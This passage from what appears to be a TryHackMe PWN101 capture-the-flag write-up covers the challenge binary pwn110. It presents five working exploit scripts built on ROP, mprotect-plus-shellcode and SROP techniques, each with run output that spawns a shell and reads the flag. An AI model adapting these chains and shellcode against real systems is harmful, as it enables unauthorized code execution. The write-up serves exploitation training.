buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x0000000000470d20) # add rax, 1 ; ret
buffer += pack('<Q', 0x00000000004012d3) # syscall

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit_ropgadgets.py 
[+] Starting local process './pwn110': pid 9161
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
pwn110  exploit_ropgadgets.py
```

##### Remote Exploitation:
```text
$ python3 exploit_ropgadgets.py REMOTE HOST=$IP PORT=9010
[+] Opening connection to XX.XX.XX.XX on port 9010: Done
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ whoami
pwn110
$ cat flag.txt
THM{XXXXXXXXXXXXXXXXXXX}
```

#### Exploit 2 (Custom execve ROP Chain):
Instead of using `ROPgadget` to find the gadgets and build the **ROP chain** for me, I used `ROPgadget` along with `ropper` to find gadgets and manually built the **ROP chain** which was shorter than the original chain built by `ROPgadget`. The reason mine was shorter was because instead of using multiple `add rax, <num>` gadgets, I just popped the register and then directly passed the number I wanted to be in that register. Although this method can introduce null-bytes into the **ROP chain** which could make exploits fail in some binaries, it worked for this exploit. I also decided to write `/bin//sh` into the `.bss` section rather than `.data`. It does not make much of a difference because both sections are writable, however I opted to use `.bss` because it was larger than the `.data` section which I thought would be more ideal for larger **ROP chains** as well as for what you will see in the next few exploits.

```python
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn110", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset

bss_address = 0x00000000004c2240

# Gadgets
mov_qword_rsi_rax = p64(0x000000000047bcf5)
pop_rdi_ret = p64(0x000000000040191a)
pop_rdx_ret = p64(0x000000000040181f)
pop_rsi_ret = p64(0x000000000040f4de)
pop_rax_ret = p64(0x00000000004497d7)
syscall = p64(0x00000000004012d3)

# ROP Chain
"""Write '/bin//sh' into .bss"""
buffer += pop_rsi_ret
buffer += p64(bss_address)
buffer += pop_rax_ret
buffer += b"/bin//sh"
buffer += mov_qword_rsi_rax

"""Set RSI 0"""
buffer += pop_rsi_ret
buffer += p64(0)

"""Set RDX 0"""
buffer += pop_rdx_ret
buffer += p64(0)

"""Set RDI to address of .bss"""
buffer += pop_rdi_ret
buffer += p64(bss_address)

"""Set RAX 59"""
buffer += pop_rax_ret
buffer += p64(59)

"""Call execve"""
buffer += syscall

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit_execve.py 
[+] Starting local process './pwn110': pid 11390
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
exploit_execve.py    pwn110
```

#### Exploit 3 (Custom mprotect syscall + Shellcode ROP Chain):
- [mprotect() Manual Page](https://www.man7.org/linux/man-pages/man2/mprotect.2.html)

```c
#include <sys/mman.h>

int mprotect(size_t size; void addr[size], size_t size, int prot);
```
*"`mprotect()` changes the access protections for the calling process's memory pages containing any part of the address range in the interval `[addr, addr+size-1]`. `addr` must be aligned to a page boundary."*

The premise of this exploit is to build a **ROP chain** to write some shellcode somewhere in memory *(the .bss section in this case)*, then continue the **ROP chain** to setup the registers for the `mprotect` syscall to make the section of memory, containing the shellcode, executable before finally returning to the shellcode and having it be executed.

As mentioned in the manual page for `mprotect`, it takes three arguments, the start address of the section of memory to change protections on, the size of the memory region, and finally the protections. These arguments are passed via the corresponding registers: **RDI** (**start address**), **RSI** (**size**), and **RDX** (**protections**).

It also mentions that the start address *must* be aligned to a page boundary. On the majority of systems, the page size is `4096` (`0x1000`) bytes. To calculate the page aligned address for the `.bss` section, we first need to find the address of it.

```bash
$ readelf -S ./pwn110 -W
There are 32 section headers, starting at offset 0xd4690:

Section Headers:
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
  [SNIPPED]
  [19] .got              PROGBITS        00000000004bfef8 0beef8 0000f0 00  WA  0   0  8
  [20] .got.plt          PROGBITS        00000000004c0000 0bf000 0000d8 08  WA  0   0  8
  [21] .data             PROGBITS        00000000004c00e0 0bf0e0 001a50 00  WA  0   0 32
  [22] __libc_subfreeres PROGBITS        00000000004c1b30 0c0b30 000048 00  WA  0   0  8
  [23] __libc_IO_vtables PROGBITS        00000000004c1b80 0c0b80 0006a8 00  WA  0   0 32
  [24] __libc_atexit     PROGBITS        00000000004c2228 0c1228 000008 00  WA  0   0  8
  [25] .bss              NOBITS          00000000004c2240 0c1230 001718 00  WA  0   0 32
  [SNIPPED]
```

The address of `.bss` in the binary is `0x00000000004c2240` and it has a size of `0x001718` (`5912`) bytes and it has the flags **WA** where the **W** means that it is writable.

To calculate the page aligned address, we can perform a bitwise masking operation on it. Assuming the page size is `4096` (`0x1000`). We can use the mask `0xfff` (`4095`) to clear the lower 12 bits.

```bash
address = 0x00000000004c2240
print(hex(address & ~0xfff))

0x4c2000
```

The mathemiatical equivelant of this operation is `0x00000000004c2240 - (0x00000000004c2240 % 0x1000)`.

As for the size, we need to change the protections on a full page of memory or a multiple of a page size, so we will change `0x1000` bytes of memory to **RWX**.

```python
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn110", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset

bss_address = 0x00000000004c2240

# Gadgets
mov_qword_rsi_rax = p64(0x000000000047bcf5)

pop_rdi_ret = p64(0x000000000040191a)
pop_rdx_ret = p64(0x000000000040181f)
pop_rsi_ret = p64(0x000000000040f4de)
pop_rax_ret = p64(0x00000000004497d7)

xor_rax_rax_ret = p64(0x0000000000443e30)
add_rax_three_ret = p64(0x0000000000470d30)
add_rax_one_ret = p64(0x0000000000470d20)

syscall = p64(0x00000000004173d4)

# Shellcode (30 bytes)
shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

# ROP Chain
"""Write shellcode in chunks of 8-bytes into .bss"""
for index in range(0, len(shellcode), 8):
	chunk = shellcode[index:index+8].ljust(8, b"\x00")	# Pad each chunk to 8-bytes
	"""Place address of .bss into RSI"""
	buffer += pop_rsi_ret
	buffer += p64(bss_address + index)
	"""Place chunk into RAX"""
	buffer += pop_rax_ret
	buffer += chunk
	"""Write chunk into .bss"""
	buffer += mov_qword_rsi_rax

"""Setup registers for mprotect (RAX = 10, RDI = .data address, RSI = 32, RDX = 0x7 [RWX])"""
"""Setup RAX"""
buffer += xor_rax_rax_ret
buffer += add_rax_three_ret * 3
buffer += add_rax_one_ret

"""Setup RDI"""
page_bss_address = bss_address & ~0xfff
buffer += pop_rdi_ret
buffer += p64(page_bss_address)

"""Setup RSI"""
buffer += pop_rsi_ret
buffer += p64(0x1000)

"""Setup RDX"""
buffer += pop_rdx_ret
buffer += p64(7)

"""Call mprotect()"""
buffer += syscall

"""RSP = Address of .bss"""
buffer += p64(bss_address)

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit_mprotect_syscall.py 
[+] Starting local process './pwn110': pid 13192
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
exploit_mprotect_syscall.py	  pwn110
```

#### Exploit 4 (mprotect + Shellcode ROP Chain):
Looking through the symbols in the binary, I noticed that the `__mprotect` function is included in the binary in a function named `_dl_make_stack_executable` but is never actually called during the standard operation of the binary. Still, this is useful because the `mprotect()` function is used to set specific protections on a section of memory, be that **Read (0x1)**, **Write (0x2)**, **Execute (0x4)**, or a combination of them all.

In this exploit, I used the `mprotect()` function to make the `.bss` section **RWX** (**Read Write Execute**) after writing shellcode into it, then returning to the address of the shellcode to execute it.

```python
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn110", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset

bss_address = 0x00000000004c2240

# Gadgets
mov_qword_rsi_rax = p64(0x000000000047bcf5)

pop_rdi_ret = p64(0x000000000040191a)
pop_rdx_ret = p64(0x000000000040181f)
pop_rsi_ret = p64(0x000000000040f4de)
pop_rax_ret = p64(0x00000000004497d7)

# Shellcode (30 bytes)
shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"

# ROP Chain
"""Write shellcode in chunks of 8-bytes into .bss"""
for index in range(0, len(shellcode), 8):
	chunk = shellcode[index:index+8].ljust(8, b"\x00")	# Pad each chunk to 8-bytes
	"""Place address of .bss into RSI"""
	buffer += pop_rsi_ret
	buffer += p64(bss_address + index)
	"""Place chunk into RAX"""
	buffer += pop_rax_ret
	buffer += chunk
	"""Write chunk into .bss"""
	buffer += mov_qword_rsi_rax

"""Setup registers for mprotect (RAX = 10, RDI = .data address, RSI = 32, RDX = 0x7 [RWX])"""
"""Setup RDI"""
page_bss_address = bss_address & ~0xfff		# Calculate page boundary (page size is usually 4096 bytes (0x1000))
buffer += pop_rdi_ret
buffer += p64(page_bss_address)

"""Setup RSI"""
buffer += pop_rsi_ret
buffer += p64(0x1000)

"""Setup RDX"""
buffer += pop_rdx_ret
buffer += p64(7)

buffer += p64(0x000000000040101a)

"""Call mprotect()"""
buffer += p64(binary.sym['__mprotect'])

"""RSP = Address of .bss"""
buffer += p64(bss_address)

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit_mprotect.py 
[+] Starting local process './pwn110': pid 13820
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
exploit_mprotect.py	  pwn110
```

#### Exploit 5 (rt_sigreturn syscall -> execve syscall):
In this exploit, I used a technique named **SROP** (**Sigreturn Oriented Programming**). During a standard **ROP chain**, individual gadgets are used to alter specific registers, each gadget is executed after the previous based on returns. In **SROP**, it still uses chains, however it uses the Linux signal handling mechanism after a syscall. Once a syscall has finished executing, the kernel restores the previous CPU state (the register values) from a **singal frame** stored on the stack.

In Layman's terms, the values of each register are placed onto the stack in a specific order, then the syscall is executed, then the values are popped from the stack back into the corresponding registers.

There is a syscall named `rt_sigreturn` which is the syscall number `15` (`0xf`) in **x86-64** Linux systems. This syscall can be used to forge register values which after the syscall will be populated. It allows us to setup the registers for another syscall, specifically to `execve` in this case, immediately after the `rt_sigreturn` syscall finishes.

I used `pwntools` built-in `SigreturnFrame()` class to set the specific register values for `execve` and build the chain of values which will be written onto the stack after the syscall.

Setting the **RIP** to the address of the syscall gadget will immediately execute a syscall after the `rt_sigreturn` syscall is finished as long as the other registers are populated correctly.

```python
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./pwn110", checksec=False)
context.log_level = "INFO"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
offset = 40
buffer = b"A"*offset

bss_addr = 0x00000000004c2240

syscall_addr = 0x00000000004173d4

mov_qword_rsi_rax = p64(0x000000000047bcf5)
pop_rsi_ret = p64(0x000000000040f4de)
pop_rax_ret = p64(0x00000000004497d7)

# Write /bin//sh into .bss
buffer += pop_rsi_ret
buffer += p64(bss_addr)
buffer += pop_rax_ret
buffer += b"/bin//sh"
buffer += mov_qword_rsi_rax

# Set RAX to 15 (0xf) (sigreturn syscall)
buffer += pop_rax_ret
buffer += p64(15)

# Build sigreturn frame for execve
frame = SigreturnFrame()
frame.rax = 59              # execve syscall number
frame.rdi = bss_addr        # Address of "/bin//sh" in .bss
frame.rsi = 0               # execve *argv
frame.rdx = 0               # execve *envp
frame.rip = syscall_addr    # Address of the syscall gadget

# syscall sigreturn
buffer += p64(syscall_addr)
# Write sigreturn register values onto stack
buffer += bytes(frame)

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

#~~~< Exploit Code Here >~~~#
p.sendline(buffer)
p.interactive()

# Close connection
p.close()
```

```text
$ python3 exploit_sigreturn.py 
[+] Starting local process './pwn110': pid 14280
[*] Switching to interactive mode
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 110          

Hello pwner, I'm the last challenge 😼
Well done, Now try to pwn me without libc 😏
$ ls
exploit_sigreturn.py	  pwn110
```

## References
- [TryHackMe PWN101](https://tryhackme.com/room/pwn101)
- [Sigreturn Oriented Programming](https://amriunix.com/posts/sigreturn-oriented-programming-srop/)
- [Return Oriented Programming](https://ctf101.org/binary-exploitation/return-oriented-programming/)
- [Linux Man Pages](https://www.man7.org/linux/man-pages/)
- [x86-64 Syscall Table](/assembly/x86-64-syscall-table.html)
- [LIBC Database](https://libc.rip/)
- [GDB](https://sourceware.org/gdb/)
- [GEF (GDB Add-on)](https://github.com/hugsy/gef)
- [pwndbg (GDB Add-on)](https://github.com/pwndbg/pwndbg)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [ropper](https://github.com/sashs/Ropper)
- [Cutter (The disassembler I use)](https://cutter.re/)